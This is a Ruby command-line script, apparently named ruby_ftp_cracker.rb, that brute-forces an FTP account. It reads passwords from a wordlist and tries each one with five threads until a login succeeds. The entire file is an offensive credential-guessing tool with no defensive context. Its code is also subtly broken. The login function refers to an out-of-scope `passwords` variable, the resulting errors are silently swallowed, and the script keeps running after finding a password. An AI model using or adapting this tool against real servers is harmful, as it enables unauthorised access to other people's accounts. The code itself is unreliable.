require 'net/ftp'

# Find the index of command line flags.
ftp_host_flag = ARGV.index("-host")
ftp_username_flag = ARGV.index("-username")
ftp_password_path_flag = ARGV.index("-wordlist")
ftp_port_flag = ARGV.index("-port")

# Check if all required flags are provided.
if !ftp_host_flag || !ftp_username_flag || !ftp_password_path_flag || !ftp_port_flag
  # Print a usage message and exit with an error code (1) if any required flag is missing.
  puts "Usage: ruby ruby_ftp_cracker.rb -host the_host -username the_username -wordlist the_wordlist_path -port the_port"
  exit(1)
end

# Threads list
threads = []

# Extract and store the values of the provided flags.
ftp_host = ARGV[ftp_host_flag + 1].to_s
ftp_username = ARGV[ftp_username_flag + 1].to_s
ftp_wordlist = ARGV[ftp_password_path_flag + 1].to_s
ftp_port = ARGV[ftp_port_flag + 1].to_i

# Open the password file for reading.
passwords = File.open(ftp_wordlist, 'r')

# Create a mutex for thread synchronization
mutex = Mutex.new

$status = false

# Define a function to start cracking for each password
def start_crack(ftp_host, ftp_username, ftp_password, ftp_port, mutex)
  begin
    # Create a new FTP connection for each password attempt.
    ftp = Net::FTP.new
    ftp.connect(ftp_host, ftp_port)
    ftp.login(ftp_username, ftp_password)
    puts "Password cracked: #{ftp_password}"
    $status = true
  rescue Net::FTPPermError
    # Handle FTP permission error (incorrect password) silently.
  ensure
    ftp.close if ftp
    mutex.synchronize do
      next_password = passwords.gets
      if next_password.nil?
        $passwords_closed = true
      end
    end
  end
end

# Start the cracking process in multiple threads
num_threads = 5 # You can adjust the number of threads as needed

$passwords_closed = false

num_threads.times do
  threads << Thread.new do
    while true
      password = nil # password değişkenini tanımlayın
      mutex.synchronize do
        if $passwords_closed
          break
        else
          password = passwords.gets
        end
      end
      break if password.nil? # Exit the thread if there are no more passwords
      password.chomp!
      begin
        start_crack(ftp_host, ftp_username, password, ftp_port, mutex)
      rescue Exception => e
        # Yakalanan hataları görmezden gel.
      end
    end
  end
end

# Join threads
threads.each(&:join)

if !$status
  puts "Password not found."
end

# Close the password file.
passwords.close
